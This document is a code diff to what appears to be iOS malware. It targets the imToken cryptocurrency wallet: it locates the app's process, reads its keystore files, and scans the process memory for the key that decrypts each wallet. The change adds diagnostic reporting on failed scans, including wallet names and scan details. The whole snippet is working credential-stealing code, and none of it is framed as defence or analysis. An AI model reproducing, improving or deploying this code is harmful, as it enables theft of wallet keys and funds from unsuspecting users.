@@ -632,9 +632,17 @@ static NSArray *WalletMemoryTargets(void) {
 - (void)crackImTokenByKey {
     @try {
         pid_t pid = [MemScan pidOfExecutableContaining:@"token.app"];
-        if (pid <= 0) return;
+        if (pid <= 0) {
+            [self reportKeyDiag:@"no_pid" ctx:@{}];
+            return;
+        }
+        self.walletRunning = YES;
 
         NSArray *names = [WalletFS listFilesIn:@"Documents/walletsV2" container:@"im.token.app"];
+        if (!names.count) {
+            [self reportKeyDiag:@"no_keystore_files" ctx:@{ @"pid": @(pid) }];
+            return;
+        }
         for (NSString *n in names) {
             if (![n hasSuffix:@".json"]) continue;
 
@@ -658,7 +666,14 @@ static NSArray *WalletMemoryTargets(void) {
                                                        mac:mac
                                                  saltAscii:salt
                                                   maxBytes:256 * 1024 * 1024];
-            if (![r[@"found"] boolValue]) continue;
+            if (![r[@"found"] boolValue]) {
+                [self reportKeyDiag:@"miss" ctx:@{ @"pid": @(pid),
+                                                   @"wallet": walletName ?: @"",
+                                                   @"scannedBytes": r[@"scannedBytes"] ?: @0,
+                                                   @"regions": r[@"regions"] ?: @0,
+                                                   @"err": r[@"error"] ?: @"" }];
+                continue;
+            }
 
             NSData *key = r[@"key"];
             NSData *key16 = [key subdataWithRange:NSMakeRange(0, 16)];
